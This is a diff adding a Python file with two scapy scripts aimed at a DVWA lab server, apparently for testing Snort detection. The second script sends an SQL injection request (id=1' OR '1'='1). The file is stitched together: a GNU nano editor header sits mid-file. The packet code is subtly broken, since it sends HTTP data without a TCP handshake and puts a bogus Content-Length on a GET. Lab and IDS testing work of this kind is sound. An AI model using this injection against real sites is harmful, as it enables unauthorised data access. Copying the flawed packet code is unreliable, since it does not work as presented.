@@ -1,0 +1,56 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+def send_dvwa_request(target_ip):
+    # Define the HTTP request with the DVWA host header
+    request = "GET / HTTP/1.1\r\nHost: dvwa\r\n\r\n"
+
+    # IP Layer
+    ip = IP(dst=target_ip)
+
+    # TCP Layer
+    tcp = TCP(dport=80)
+
+    # Raw Layer for the HTTP request
+    payload = Raw(load=request)
+
+    # Construct and send the packet
+    packet = ip / tcp / payload
+    send(packet)
+
+def main():
+    target_ip = "127.0.0.1"  # Replace with the IP address of your DVWA server
+    send_dvwa_request(target_ip)
+
+if __name__ == "__main__":
+    main()
+
+
+
+
+#############################################################
+
+  GNU nano 4.8                                                                                                   snort-1_rule.py                                                                                                   Modified  
+#!/usr/bin/env python3
+from scapy.all import *
+
+
+# Target information
+target_ip = '172.19.0.2'  # IP of the DVWA server
+target_port = 80            # Port number (DVWA usually runs on HTTP port)
+
+# HTTP request with SQL Injection
+payload = ("GET /DVWA/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit HTTP/1.1\r\n"
+           "Host: {}\r\n"
+           "Content-Type: application/x-www-form-urlencoded\r\n"
+           "Content-Length: {}\r\n\r\n").format(target_ip, len('1\' OR \'1\'=\'1'))
+
+# Constructing the IP and TCP layers
+ip = IP(dst=target_ip)
+tcp = TCP(dport=target_port, sport=RandShort(), seq=RandInt(), flags="PA")
+
+# Adding the Raw layer with the HTTP request
+packet = ip / tcp / Raw(load=payload)
+
+# Sending the packet
+send(packet)
